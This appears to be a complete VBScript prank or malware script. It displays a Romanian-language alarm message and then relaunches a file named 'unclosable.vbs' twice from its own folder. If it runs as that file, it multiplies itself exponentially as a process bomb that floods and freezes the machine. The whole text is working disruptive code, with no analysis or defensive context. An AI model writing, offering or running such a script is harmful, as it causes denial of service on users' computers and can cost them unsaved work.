Dim objFSO
Set objFSO = CreateObject("Scripting.FileSystemObject")

Sub RecursiveTask()
    MsgBox "ATENTIUNE: A VENIT BELEAUA!!!", vbExclamation, "Warning"

    Dim shell
    Set shell = CreateObject("WScript.Shell")
    Dim scriptPath
    scriptPath = objFSO.GetParentFolderName(WScript.ScriptFullName) & "\unclosable.vbs"
    shell.Run """" & scriptPath & """", 1, False
    shell.Run """" & scriptPath & """", 1, False
    Exit Sub
End Sub

RecursiveTask()